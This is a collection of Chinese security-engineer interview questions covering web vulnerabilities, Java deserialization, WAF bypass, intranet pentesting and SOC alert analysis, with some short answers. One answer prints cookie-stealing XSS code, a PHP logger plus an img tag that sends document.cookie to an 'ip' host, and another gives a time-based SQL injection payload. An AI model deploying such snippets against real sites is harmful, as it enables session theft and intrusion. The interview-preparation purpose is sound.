20. 1. 面试没听清楚，听到隧道就以为是UDP穿越隧道开讲了

21. https证书机制介绍

22. burpsuite一些使用方法，插件开发方法

23. nmap的基本操作

24. syn开放链接原理

25. redis漏洞利用

26. runc容器逃逸原理

27. 常见WAF种类(不知道为什么还特别问了长亭的WAF)

28. MySQL的UAF

29. 1. 没听过

30. 算法题(比较简单，leetcode easy级别)

31. Linux进程通信

32. 反问



------



> 备注：从0x18~0x1B均来自于许少牛客网的分享，不多说了，许少yyds
> 作者：4ra1n
> 链接：
> https://www.nowcoder.com/discuss/772753?source_id=profile_create_nctrack&channel=-1
> 来源：牛客网

# 0x18 某四字大厂面试复盘

这个面试有许少的两个问答式文章，建议参考

一面链接：
https://zhuanlan.zhihu.com/p/412934756

二面链接：
https://zhuanlan.zhihu.com/p/413684879

# 一面

1. 看你做java多一些，讲讲java内存马原理和利用
2. 那你讲下如何查杀java内存马，工具和原理角度
3. 冰蝎和哥斯拉了解吗，讲讲原理
4. 你之前在其他公司实习做了些什么事情
5. 有绕waf的实战经验吗，从各种漏洞的角度谈下
6. 熟悉webshell免杀吗，讲下原理
7. 做过其他免杀吗，比如结合cs和msfvenom的
8. 谈谈fastjson反序列化原理和常见利用链吧
9. 数据结构熟悉吗，谈谈红黑树原理
10. java的hashmap用到红黑树，讲下hashmap的原理
11. 有没有流量分析的经验
12. 谈谈代码审计经验
13. 看你有些cnvd和cve，讲讲挖洞的过程
14. 有打过知名的ctf吗，讲将经历
15. 熟悉内网渗透，域控这些，说一下实战经历
16. 谈谈java反序列化的cc链原理吧
17. 看你重写过sqlmap，读过sqlmap源码吗
18. 看你熟悉mysql，讲讲索引，存储结构等
19. 讲讲mysql为什么要用b+树
20. 看过mysql源码吗
21. 分析过二进制漏洞吗
22. 有没有用汇编写过东西
23. 谈谈linux内核的漏洞
24. 挖过缓冲区溢出漏洞吗
25. python的沙箱逃逸了解吗
26. python的flask模版注入讲讲
27. 看你做过抽象语法树相关的项目，谈一谈
28. 讲讲rasp的概念和原理
29. 谈谈rasp的对抗
30. 谈谈php和golang语言本身的安全问题
31. 机器学习和算法相关懂嘛
32. 看你尝试写过简单的操作系统，谈谈思路
33. 你有什么要问我的吗

# 二面

1. 讲讲你挖过印象最深的洞
2. 讲讲你写过的安全工具，从出发点和原理层面谈谈
3. 讲讲文件上传这里怎样绕WAF
4. SSRF的利用和绕WAF手段
5. 谈谈MSSQL如果XPCMDSHELL不能用怎么拿SHELL
6. 遇到没有回显的RCE怎么办
7. 不使用SQLMAP的OS-SHELL，各种数据库怎么写SHELL
8. 给你一个比较大的日志，应该如何分析
9. 谈谈redis未授权会导致哪些问题
10. 讲讲SYN FLOOD原理，防御，检测手段
11. 讲讲UDP反射放大的原理，防御，检测手段
12. 说一说自己的优势吧
13. 你有什么要问我的吗

# 三面

1. Padding Oracle Attack讲讲
2. Fastjson反序列化原理以及1.2.47绕过的原理
3. 除了readObject以外造成反序列化的函数有哪些
4. CC链中找你最熟悉的几条链讲一讲
5. Shiro550反序列化的原理及利用工具编写思路
6. Spring/Struts2的RCE中印象最深的讲一讲分析过程
7. sql注入绕WAF的方式尽可能多说
8. 分块传输绕WAF的原理
9. 文件上传绕WAF的方式都有哪些
10. 讲讲你挖过这些CVE中印象最深的
11. 你自己最大的优点和缺点是什么
12. 未来你想做安全的哪一个领域
13. 你学校成绩如何有挂科吗
14. 你有什么要问我的吗

# 0x19 某四字大厂实习面试复盘

# 一面

1. 自我介绍
2. 数组和链表各自的优势和原因
3. 操作系统层面解释进程和线程区别
4. 线程和进程通信方式以及数据安全问题
5. 多进程和多线程的选用场景以及原因
6. 了解过哪些WAF说说原理
7. 尽可能多地说下SQL注入绕WAF方式
8. FUZZ绕WAF的Payload长度通常是多少
9. 写过哪些正则说说具体的场景
10. 不查资料不能测试直接写ipv4的正则
11. Fastjson的反序列化原理
12. Java反射机制会导致怎样的安全问题
13. XSS和CSRF的相同点以及如何配合利用
14. CSRF_TOKEN的位置以及原理和绕过
15. 尽可能多地说你所知道的HTTP头
16. Nmap常见扫描方式的原理以及NSE脚本原理
17. 看到你有不少CNVD证书讲一讲挖洞过程
18. 讲一讲你考过的证书都学到了些什么
19. 看到你Github有不少项目讲讲
20. 你觉得自己还有什么亮点吗
21. 你有什么要问我的

# 二面

1. 自我介绍
2. 熟悉哪些Web漏洞讲讲
3. 跨域的解决办法原理以及安全问题
4. Python多进程和多线程如何选择
5. Python的GIL锁本质上做了什么事情
6. Java的JVM为什么要有GCROOT
7. Java的JVM有哪些垃圾收集器
8. 垃圾回收计数引用机制的缺点是什么
9. CSRF怎么拿到Cookie
10. 如何判断一个网站是钓鱼网站
11. 不同域名怎样通过CSRF拿Cookie
12. 说一些常见的HTTP头以及作用
13. HTTP-Only本质上做了什么事情
14. 平衡二叉树和二叉搜索树讲一下
15. SYN Flood攻击原理及解决方案
16. SYN 反向探测的原理是什么
17. TCP SYN Cookie的原理
18. ARP欺骗攻击原理及解决方案
19. UDP端口探测的有效方式是什么
20. Nmap的FIN扫描和空扫描是什么
21. 三次握手的序列号变化说一下
22. Python的值类型和引用类型是哪些
23. Python的list和dict线程安全吗
24. 讲一下你做过收获最大的一个项目
25. 你有什么要问我的

# 三面

1. 自我介绍
2. 解释下CSRF
3. 结合实际的例子说说SSRF
4. 结合实际的例子讲讲RCE
5. 为什么现在文件上传很少了
6. 基于语义分析的WAF了解吗
7. 讲一下你上一段实习做了什么
8. 讲几个印象深刻的挖洞经历
9. 讲一下你对未来的规划
10. 有没有转正的意愿
11. 你有什么要问我的

# 四面（HR）

1. 面试的体验怎么样
2. 谈人生理想
3. 最早实习时间

# 0x1A 某两字大厂面试复盘

# 一面

1. 自我介绍
2. 前两段实习做了些什么
3. 中等难度的算法题
4. java的class文件结构
5. kafka的原理了解吗
6. fastjson反序列化原理
7. 讲讲你研究最深入的领域

# 二面

1. 排序处不能用预编译应该怎么防
2. 从白盒黑盒两个角度讲下挖过的漏洞
3. ssrf的绕过和防御
4. 讲讲fortity等代码审计工具原理
5. 存储过程角度讲讲预编译的原理
6. csp是如何防御xss的
7. csrf为什么用token可以防御
8. 给你一个项目讲下审计思路
9. 内网相关的问题
10. 讲下你挖过的逻辑漏洞
11. 讲讲你用golang写过的东西
12. 什么是安全

# 三面

1. 讲下你自己写ysoserial的思路
2. 确定sql注入漏洞后如何进一步利用
3. 泛微OA的漏洞原理讲讲
4. 新爆出的Confluence RCE讲讲
5. 以前的实习中做了什么事
6. ***原理以及实战中的绕过
7. 红蓝对抗的流程讲讲

# 四面

1. java反序列化原理和工具
2. 讲讲关于指纹识别的方式
3. shiro反序列化工具的原理
4. 不用sqlmap情况下sql注入点如何找
5. 讲讲你挖到的这几个cve
6. 二进制方面有无了解

# 0x1B 某安全公司-安全研究员

# 一面

1. 讲讲你写的几个Burp插件原理
2. 做过什么JavaWeb项目吗
3. CC1-7找熟悉的讲一下原理
4. Fastjson和Jackson反序列化原理讲讲
5. BCEL可以用其他类加载器吗
6. XStream反序列化讲讲
7. 最基本的反序列化原理是什么
8. 了解JEP290的原理吗
9. 讲下RMI原理以及相关的漏洞
10. JdbcRowSetImpl如何触发的JNDI注入
11. CC链四个Transformer区别
12. 讲下你挖过的CVE和CNVD
13. 反序列化除了readObject还有什么触发点
14. 讲下Spring相关的RCE原理
15. 讲讲IIOP和T3反序列化原理
16. PHP等语言的反序列化讲讲

# 二面

1. 做了几年安全
2. 未来想做什么
3. 讲讲实习期间做的事
4. 工作地点要求





不会的面试官都给解答了

1.ssrf漏洞的危害，
2.ssrf利用中常用的协议，
3.ssrf中使用gopher协议的最大的好处
gopher是tcp层的，可以发get和post，一些攻击场景需要post搞定
4.ssrf常见绕过方式
5.如何重定向绕过
301/302重定向都可以
6.@符号绕过的原理
@符号之前是账号密码的形式
7.dns重绑定绕过讲一下
8.简单描述下sql注入漏洞的危害
9.sqlserver通过注入怎么执行命令
10.sqlmap中–os-shell的原理
\11. mysql常见的报错函数
12.手写一个基于时间的盲注
13.udf提权
14.mysql写shell的前提有哪些，写文件语句是什么
\15. mysql漏洞防御
16.命令执行漏洞考会虑哪些符号
17.命令执行漏洞中无回显如何通过dnslog把whoami的结果带出来
18.网络七层模型或者五层模型简单描述一下
19.应用层哪些常见的协议
20.传输层哪些协议
21.arp协议是那一层的
22.tcp和udp最大的区别是什么
23.python的flask框架了解吗
24.flask开启debug模式有什么危害，django呢
django开启debug会造成信息泄露，flask开启debug时1信息泄露2如果有ping码会开启一个shell
25.python多进程通信如何做到的
26.编程，一系列带点的版本号排序
27.有没有一些特别擅长的，还没有聊到的
28.别的啥想问的





### 只给你一个网址，如何进行渗透测试

### SQL注入，id=1如何检测？orderby怎么利用？limit语句怎么利用？盲注有什么？

### sleep被禁用后还能怎么进行sql注入

BENCHMARK，Get_lock函数，当都被禁用后可以用计算量比较大的语句使数据库查询时间变长，从而达到延时注入的效果。 mysql：`AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.SCHEMATA C);`

### XSS可以控制属性怎么利用

### CSRF怎么防护？

尽量使用POST，限制GET；浏览器Cookie策略；加验证码； Referer Check；Anti CSRF Token

### 请求头中哪些是有危害的？

Cookie

### XXE的危害？哪些地方容易存在xxe？xxe架构方面有没有了解过

xxe常见场景是如pdf在线解析、word在线解析、定制协议，留言板等，跟逻辑设计有关而与语言无关，最好是不要让XML作为参数传输或整体结构可被用户篡改。如果一定要使用，至少要禁用DTD、Entity。 xxe危害 读取本地文件，执行系统命令，探测内网端口，攻击内网服务 探测内网端口的协议有gopher file dict，不同语言支持不同的协议，是具体情况而定 file http ftp是常用的

防范，python用lxml时可以对resolve_entities设为false。或者过滤用户提交的xml

客户端也可以有xxe攻击，有的网站会使用office打开docx进行解析 Java解析XML的常用三方库，如果不禁用DTD、Entity都会导致XXE漏洞：

javax.xml.stream.XMLStreamReader;

javax.xml.parsers.DocumentBuilderFactory;

### JAVA中间件的漏洞，举几个例子？

常见的是反序列化漏洞

### IIS常见的漏洞

常见的为解析漏洞，6.0有 /test.asp/test.jpg test.asp;.jpg 7.5有test.jpg/.php，默认后缀IIS默认地还会解析其他后缀的文件为asp文件，比如cer asa cdx 原理大抵是IIS 5.x/6.0在从文件路径中读取文件后缀时，遇到一个“.”后，便进入了一种截断状态，在该状态下遇到特殊符号——“/”和“;”，都会进行截断，只保留特殊符号前的部分，即：“.asp”，从而认为文件后缀为“.asp”。

### python有哪些框架，其中出现过哪些漏洞

flask的模板注入 模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。 模板字符串中字符串拼接或替换可能会导致敏感信息泄露，获取变量值 如果开发者在flask使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数，该函数不会对输入进行实体转义将URL传递进入模板内容当中，会导致xss的产生。 还可以利用模板中html标签属性字段绕过xss过滤。

Django出现过目录遍历漏洞

### 业务逻辑漏洞，用户任意密码重置举出有什么例子，因为什么因素导致的？

### PHP代码审计？开源的代码审计有没有做过？弱类型比较，反序列化漏洞这种考点在哪？

### HTTP-Only禁止的是JS读取cookie信息，如何绕过这个获取cookie

Http Trace攻击就可以将你的Header里的Cookie回显出来，利用Ajax或者flash就可以完成这种攻击；或者配置或者应用程序上可能Bypass，比如header头的泄漏



　　1、注入攻击原理是什么?如何找注入点?如何判断注入点?

　　2、注入分为几类及提交方式是什么

　　3、注入攻击一般所支持的类型有那些

　　4、mysql数据库帐号和密码存放在那个库和表里面

　　5、如何寻找网站物理路径

　　6、分别写出mysql及mssql数据库写入webshell的方法

　　7、请说出mysql5.0以下与5.0以上的区别

　　8、sql注入对服务器文件读写操作需要那些条件

　　9、分别说出sqlmap -u -r -v -p --level --risk --tables --coiumns -T --tamper参数的含义

　　10、注入漏洞防范方法

　　11、xss攻击原理及出现的原因

　　12、xss分为那几类

　　13、xss的危害，可能存在的地方

　　14、xss漏洞测试方法

　　15、xss如何绕过安全防范

　　16、分别说出iis、apache、nginx解析漏洞原理

　　17、任意文件下载攻击原理及测试方法

　　18、任意文件上传漏洞分几类，说出每类突破方法

　　19、分别文件包含漏洞攻击原理及分类

　　20、如何快速挖包涵漏洞

　　21、包涵漏洞具体能做什么，怎么绕过你能说说吗

　　22、ssrf漏洞攻击原理、用途

　　23、说说你是如何挖掘ssrf漏洞

　　24、说说ssrf绕过及防范方法

　　25、csrf攻击原理是什么及一般你用什么工具进行检测

　　26、你是如何挖掘ssrf漏洞的及防范方法

　　27、说说xxe漏洞攻击原理是什么，如何找xxe漏洞及攻击方法

　　28、xxe攻击在无回显的时候你是如何突破的

　　29、你是如何防范xxe漏洞的

　　30、你挖洞影像最深的是什么?

　　31、你认为你的渗透水平在国内大概是什么水平，能给自己打多少分

　　32、说说你以前在你公司主要做什么安全工作?如每天、每月、每年做些什么安全工作

　　33、你在各大漏洞平台挖过漏洞吗，能说说吗?

　　34、你写过什么好的安全漏洞文章发布过吗，是否可以说说?



```
讲讲渗透经验与成果
给你一个站怎么验（讲到sql注入被打断）
mysql和mssql是否了解（选了mysql）
sql注入某参数（忘了）过滤应如何绕过
sqlmap的tamper有没有自己写过
sql注入写shell的前提、方法、指令
过WAF的方法（要求详细说，用什么符号，怎么用）
phpmyadmin提权思路
挖过哪些逻辑漏洞
给一个登录框，问验证漏洞的思路
常用的信息收集方法
怎么验证是否有CDN
如何绕过CDN查真实IP
同源策略原理是什么，如何绕过同源策略
为什么同源策略无法防御csrf？
B站与A站不同源的情况下如何从B站获取到A站用户信息
ARP攻击原理，防御方法
java与php的反序列原理，如何实现
sqImap osshell原理?
sqlmap udf原理?
如何只用mysq|执行系统命令?
黄金票据有了解吗?
目标主机只开了139能否利用永恒之蓝?
你入侵了一台非域成员主机，如何快速定位
其他是域成员的主机?
PHP的站限制了任何php文件上传，如何上个
php文件? (排除截断 复写数字大小写)
waf怎么绕?
你拿到了server03的hash怎么利用?
mimikatz抓密码的原理?
不用mimikatz怎么抓明文密码?
server12限制了抓取明文密码，怎么绕过?
你有一-个webshell但无法执行系统命令，无上传，怎么进行内网渗透?
你是域成员，如何拿到域控制器?
你横向渗透常用手法有哪些?
regorge有了解过吗、它的工作原理是什么?
你发现了一个mysql的延时注入如何提高速
xxe的原理是什么?背一下xxe。
哪些会受同源策略的影响?
最近的redisRCE有了解吗?它的原理是什么
你拿到了redis未授权，你会怎么利用?
你通过java站入侵了Windows，你Windows什么权限？
你拿到了域控制器你会怎么样维持权限？
```

-  

- ​    如何绕过CDN找到真实IP，请列举五种方法 (★★★)

  ​    

- ​    redis未授权访问如何利用，利用的前提条件是？(★★★)

  ​    

- ​    mysql提权方式有哪些?利用条件是什么? (★)

  ​    

- ​    windows+mysql，存在sql注入，但是机器无外网权限，可以利用吗? (★)

  ​    

- ​    常用的信息收集手段有哪些，除去路径扫描，子域名爆破等常见手段，有什么猥琐的方法收集企业信息? (★★)

  ​    

- ​    SRC挖掘与渗透测试的区别是什么，针对这两个不同的目标，实施过程中会有什么区别 (★★)

  ​    

- ​    存储xss在纯内网的环境中，可以怎么利用？(★★)

  ​    

- ​    mssql中，假设为sa权限，如何不通过xp_cmdshell执行系统命令 (★★)

  ​    

- ​    假设某网站存在waf，不考虑正面绕过的前提下，应该如何绕过(分情况讨论 云waf/物理waf) (★)

  

***\*Web安全相关\****

- ​    介绍一下自认为有趣的挖洞经历（或CTF经历）(★★★)

  ​    

- ​    CSRF的成因及防御措施（不用token如何解决) (★)

  ​    

- ​    SSRF的成因及防御措施 (★★)

  ​    

- ​    SSRF如何探测非HTTP协议(★)

  ​    

- ​    简述一下SSRF的绕过手法(★★)

  ​    

- ​    简述一下SSRF中DNSRebind的绕过原理及修复方法(★)

  ​    

- ​    介绍 SQL 注入漏洞成因，如何防范？注入方式有哪些？除了拖取数据库数据，利用方式还有哪些？(★★)

  ​    

- ​    如何通过sql注入写shell,写shell的前提条件是什么?(★★)

  ​    

- ​    介绍一下XSS漏洞的种类，dom型XSS和反射XSS的区别是什么?(★★)

  ​    

- ​    如何防范 XSS 漏洞，在前端如何做，在后端如何做，哪里更好，为什么？(★★)

  ​    

- ​    讲述一下找回密码可能涉及的逻辑漏洞(★)

  ​    

- ​    假设你是甲方的一名安全工程师，应该如何降低逻辑漏洞的出现率?(★★)

  ​    

- ​    oauth认证过程中可能会出现什么问题，导致什么样的漏洞?(★)

  ​    

- ​    CSP应该如何使用及配置，有哪些绕过CSP的方式(★★)

  ​    

- ​    已知某网站存在LFI(本地文件包含)，但是无法上传任何文件，针对该情况有哪些利用方式?(★★)

  ​    

- ​    简述一下XXE漏洞产生的原理，针对PHP和JAVA，XXE分别可以进行哪些恶意利用?(★★)

  

***\*PHP安全\****

- ​    PHP中如何使用phar://伪协议触发反序列化，利用场景以及前提条件有哪些?(★★)

  ​    

- ​    如何绕过php.ini中disable_function的限制，有哪些方法，其中成功率最高的方法是哪个，为什么?(★★★)

  ​    

- ​    文件上传中%00截断的原理是什么，官方是如何设计修复方案的?(★★)

  ​    

- ​    实现一个一句话webshell，绕过RASP的方式有哪些，绕过机器学习检测的方式有哪些，绕过AST-Tree的方式有哪些(★★)

  ​    

- ​    PHP伪协议的攻击场景有哪些？(★★)

  ​    

- ​    mail函数的攻击面有哪些?(★)

  ​    

- ​    如何不通过数字以及字符构造webshell，其原理是什么，此类特性还会造成什么安全问题?(★)

  

***\*JAVA安全\****

- ​    ClassLoader是什么? 加载自定义ClassLoader的前提是什么? (★)

  ​    

- ​    大概讲一下CommonCollections1的利用链，该利用链有什么样的限制? (★★)

  ​    

- ​    fastjson的反序列化和普通反序列化漏洞的区别是什么? (★★)

  ​    

- ​    在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗？(★)

  ​    

- ​    单向代码执行链如何实现执行多条语句，如CommonCollections1 (★)

  ​    

- ​    请简单讲述一下Shiro反序列化漏洞的原理，无法使用ysoerial中common-collections利用链的原因是什么? (★)

  

***\*安全研发相关\****

- ​    简要介绍自己常用的扫描器和其实现上的特点(★★)

  ​    

- ​    如果让你设计一个HIDS，应该如何设计(★)

  ​    

- ​    介绍一下Python中的迭代器、生成器、装饰器(★)

  ​    

- ​    介绍自己常用的python库(★)

  ​    

- ​    讲一讲celery的特点以及原理(★)

  ​    

- ​    简述Python中的GIL锁，以及如何打破GIL锁的限制(★★)

  ​    

- ​    masscan号称世界上最快的扫描器，快的原因是什么，如何实现一个自己的masscan?(★★)

  ​    

- ​    简述协程，线程，以及进程的区别(★★)

  

***\*Linux相关\****

- ​    简述一下守护进程的概念，如何生成一个守护进程? (★)

  ​    

- ​    Linux 服务器的安全运维操作有哪些？如何保护 SSH？(★★)

  ​    

- ​    入侵 Linux 服务器后需要清除哪些日志？(★★)

  ​    

- ​    反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么？(★★★)

  ​    

- ​    从主机的层面，反弹shell如何监控 (★★★)

  ​    

- ​    Rootkit的种类有哪些，针对不同种类的Rootkit应该如何防护以及检测 (★★)

  ​    

- ​    A账户创建了权限为766的文件夹adir，该文件夹中有B账户的文件password.txt，权限为B账户的700，请问B账户能否读取到adir/password.txt文件的内容 (★)

  ​    

- ​    ssh软链接后门的原理是什么，可以通过该原理构造其他后门吗?(★)

  ​    

- ​    Linux中fork的原理是什么，子进程一定会拷贝父进程的资源状态吗？(★★)

  ​    

- ​    实现R3层HOOK的方式有哪些，R0层的HOOK又有哪些? (★)

  ​    

- ​    Linux下如何准确实现应用识别，如识别nginx mysql等 (★)

  ​    

- ​    假设某Linux机器存在命令审计(方法未知)，有哪些可能的绕过方法? (★★)

  ​    

- ​    Linux常见的提权方法有哪些?(★★)

  

***\*内网渗透\****

- ​    psexec的底层实现原理是什么? (★)

  ​    

- ​    SSP接口中修复了哪个模块杜绝了mimikatz的恶意利用，具体是如何修复的？(★★)

  ​    

- ​    内网KDC服务器开放在哪个端口，针对kerbores的攻击有哪些? (★★★)

  ​    

- ​    在win10或者winserver2012中，如果需要使用mimikatz，该如何使用，修改注册表后如何在不重启机器的情况下获取NTLM? (★★)

  ​    

- ​    域内如何查询员工对应的机器？(★)

  ​    

- ​    如何查询域之间的信任关系？(★)

  ​    

- ​    域控开放的常见端口有哪些？(★)

  ​    

- ​    windows内网中ntlm协议认证过程 (★★★)

  ​    

- ​    cobalt strike中上线方式有哪些，各自是什么原理，如果需要绕过监控，如何绕？(★★)

  ​    

- ​    横向渗透中，wmic如何构造有回显的命令执行? (★★)

  ​    

- ​    windows应急响应中，需要查看哪些安全日志ID，分别对应哪些攻防场景，如果该windows主机为域控，又应该查看哪些事件日志？(★★★)

  ​    

- ​    golden ticket和sliver ticket的区别是什么？(★★★)

  ​    

- ​    在非域主机的情况下，如何快速发现域主机？(★★)

  ​    

- ​    mimikatz的原理，哪个补丁导致了mimikatz无法利用，如何绕过? (★★)

  ​    

- ​    NTLM relay的攻击场景有哪些，使用NTLM relay会受到哪些限制？(★)

  

***\*其他安全相关\****

- ​    RSA加解密流程(★)

  ​    

- ​    HTTPS是如何实现的(★★)

  ​    

- ​    如何防护运营商的DNS劫持/链路劫持(★★)

  ​    

- ​    如何防范羊毛党？(★)

  ​    

- ​    一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理(★★)





**1、一个登录的页面会存在那些安全问题？**

弱口令，爆破，SQL注入，敏感信息泄露

**2.对那种编程语言最熟悉?**

这个因为我们也就最近学过python，虽然在必修课的时候学过些java，c++但自我感觉还不到能说出口的地步。

**3.用python做过那些事情？**

好在上个月还用python编写了一个简单的poc，

**4.编写poc常用的库？**

re（正则请求库），request（网络请求库）

**5.暴力破解应该怎样防范？**

限制登录次数，增加多重认证

**6.验证码有哪些绕过的方式？**

绕过验证码。跳过验证码直接访问需要的页面内容。

请求头中自带验证码。有些网站的验证码会在前台 js 校验服务器生成的验证码会在请求头中。可以获取请求头，并把验证码解析出来。

session不刷新。有的网站验证码验证成功后，直接获取请求资源。（忘记了刷新 cookie 对应的验证码）可以预先设定一个 cookie和验证码。利用这个漏洞访问网站。对于多线程无法控制以及有些网站验证码定期不访问失效问题。可以添加一个定时访问程序来解决

利用第三方插件。对于有些网站验证码比较简单。只含阿拉伯数字和英文字母。可以用第三方的插件来识别。例如：tess4j、tesseract

有些网站的验证码是从库中随机取出一个来的。对于这类静态的验证码。可以自己建立一个验证码静态库。自己建立好图片和验证码答的链接。采用map的映射方法就可以进行识别。

**7.在windows里查看当前目录的命令?**

dir

**8.在linux查看当前命令？**

pwd

**9.查看当前文件的信息和权限**

ls -al

**10.ctf当中负责的部分？**

我是打辅助的...

**11.自己是否独立做出ctf的题？**

当然

**退一步讲，就算你不去大厂，但你但凡想在技术之路上走远一点，想成为技术大牛，做大系统，就必须搞定基础知识。**

> 渗透测试中，从端口扫描、漏洞扫描、入侵检测、红队攻击、蓝队防御等都和网络协议有关，所以渗透测试人员学好基础知识至关重要，是成为大牛的必备技能。

10 个程序员里面，10 个都说自己学过网络安全，9 个说自己懂网络安全。但真正面试的时候，能回答出相关问题的，可能只有两三个。比如：

> “TCP 协议跟 UDP 协议有什么区别？” “HTTPS 协议的底层原理是什么？” “阿里的 Dubbo
> 框架都使用了哪些传输协议和序列化协议？”

想想这些你都能答出来吗？其实，参加过大厂面试的小伙伴应该都清楚，无论是国内的互联网大厂还是硅谷的 IT 公司，面试多少会问基础知识知识。

这并不难理解，毕竟大厂更注重程序员的基本功，而且几乎所有的程序运行都会涉及到网络协议，一旦用错就容易产生灾难性的后果。

**渗透测试的流程是什么 渗透测试流程概述**

前期交互阶段、情报搜集阶段、威胁建模阶段、漏洞分析阶段、 渗透攻击阶段（Exploitation）、后渗透攻击阶段（怎么一直控制，维持访问）、 报告阶段。

攻击前：网络踩点、网络扫描、网络查点

攻击中：利用漏洞信息进行渗透攻击、获取权限

攻击后：后渗透维持攻击、文件拷贝、木马植入、痕迹擦除

**xss 如何防御**

1.对前端输入做过滤和编码： 比如只允许输入指定类型的字符，比如电话号格式，注册用户名限制等，输入检 查需要在服务器端完成，在前端完成的限制是容易绕过的； 对特殊字符进行过滤和转义；

2.对输出做过滤和编码：在变量值输出到前端的 HTML 时进行编码和转义；

3.给关键 cookie 使用 http-only

**对称加密 非对称加密？**

对称加密：加解密用同一密钥，密钥维护复杂 n（n-1）/2，不适合互联网传输 密钥，加解密效率高。应用于加密数据。

非对称加密：公钥推不出私钥，每个用户一个非对称密钥对就可以，适合于互联 网传输公钥，但是加密效率低，应用于数字签名及加密

**cookie 存在哪里？可以打开吗**

C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Cookies 工具--文件夹选项--查看--将隐藏被保护的文件的对勾去掉就会看到 cookies 文 件夹

**xss 如何盗取 cookie？**

攻击者代码：

```
$cookie=$_GET['cookie']; .. 
$time=date('Y-m-d g:i:s'); .. 
$referer=getenv('HTTP_REFERER'); .. 
$cookietxt=fopen('cookie.txt','a'); .. 
fwrite($cookietxt,"time:".$time." cookie:".$cookie." 
referer:".$referer.""); 注意双引号，容易出错 .. 
fclose($cookietxt); .. ?
```

脚本端：

```
document.write('<img src="http://ip/cookie.php?
cookie='+document.cookie+'" width=0 height=0 border=0 />');
 .. </script>
```

获取到 cookie 后，用 firebug 找到 cookie，新建 cookie 加入 cookie，用 referer 来提交，无需输入帐号密码直接登录进去！

**IIS 服务器应该做哪些方面的保护措施：**

1. 保持 Windows 升级:
2. 使用 IIS 防范工具
3. 移除缺省的 Web 站点
4. 如果你并不需要 FTP 和 SMTP 服务，请卸载它们
5. 有规则地检查你的管理员组和服务:
6. 严格控制服务器的写访问权限
7. 设置复杂的密码
8. 减少/排除 Web 服务器上的共享
9. 禁用 TCP/IP 协议中的 NetBIOS:
10. 使用 TCP 端口阻塞
11. 仔细检查*.bat 和*.exe 文件: 每周搜索一次*.bat
12. 管理 IIS 目录安全:
13. 使用 NTFS 安全:
14. 管理用户账户
15. 审计你的 Web 服务器:





天眼告警概况是在天眼哪个板块

天眼 的检索字段

天眼源ip能对应攻击ip吗

天眼攻击ip是为内网ip该怎么判断（内网失陷）

天眼是可以直接下载wireshark包吗

天眼判断log4j漏洞是否利用成功

天眼的运算符

天眼大量SQL注入告警误报原因

天眼该怎么日志检索文件上传协议数据包

syslog

IDS和IPS的区别

内网穿透代理工具告警判断（frp）

http方法和状态码

列举一些ssrf漏洞原理

正向代理和反向代理

天眼上主要看哪些板块

DNS_type

怎么判断攻击ip和受害ip

天眼大量告警会不会对公司业务产生影响

同一条告警产生多次，是什么原因

对端口进行大量扫描，是什么事件

天眼平台能不能自己封ip

蚁剑的流量特征

天眼平台对哪些攻击不容易检测出来

shell正反向

判断操作系统类型

webshell

tcp、udp区别

http请求方式

SQL原理危害

防止SQL注入

wireshark过滤

内存马

常见的中间件，及其漏洞

xff

如何溯源，linux定时任务命令是什么

如何知道流量是不是误报

渗透测试详细流程

文件上传漏洞

webshell怎么判断

你认为安全测试岗的职责是什么

护网蓝队的流程

反序列化漏洞

天眼发现文件上传告警如何进行分析

发现有服务器始终没有告警怎么办

天眼使用会影响客户吗

天眼有什么功能

天眼遇到反序列化漏洞怎么办

遇到无法判断的告警怎么办

客户明确反馈说有一个主机好像被文件上传了，你如何处理

log4j怎么在天眼里分析

三次握手四次挥手

状态码

天眼模糊匹配





奇安信面试题: https://www.cnblogs.com/rxrxrx/p/rxrxrx.html



碰巧今晚两个中介联系我面试，我当时投的是中级，所以此时有空也分享一下面试题。（忘记是哪两个中介了，大家参考一下题目）  中介一：

 1.讲一下SSRF，它出现的位置 

2.说一下黄金票据

 3.安全加固 

4.应急响应流程 （因为这个面中介的时候，我讲得多，时间长，他问的就少一些）  



中介二： 

1.在域内，如何找域控 

2.dnslog注入 

3.说一下/etc/password与/etc/shadow两个文件夹的内容及区别

 4.给你一个web登录页面，你的渗透思路 

5.Linux操作系统提权的思路 6.CSRF的防御方法  某准达中级：（几天前的，可能有些忘了） 

1.应急响应流程

 2.文件上传漏洞以及防御方法

 3.给你一个流量包，你如何判断



1，对溯源和应急响应有自己的思路么 ？ 说一下你对应急响应的思路
2，SQL注入的bypas
3，对于框架漏洞有了解吗 ？ 说一下weblogic相关的漏洞
4，说一下 apache shiro 漏洞
5，对于安全厂商的设备有没有了解





[https://www.yuque.com/hazel-tlnj ... szgkymhr?singleDoc#](https://www.yuque.com/hazel-tlnjt/iugito/iuztln7uszgkymhr?singleDoc#) 《HW面试题01》 密码：iqii







某次面试对方给的测试环境，感兴趣的可自行下载，欢迎大家来探讨自己挖出来哪些漏洞和拿到webshell的经验分享。 提示:小皮搭建 PHP用5.4.45  链接：https://pan.baidu.com/s/1HFwyz6q2d2qT5GpZtVK2dw?pwd=6666 提取码：6666 









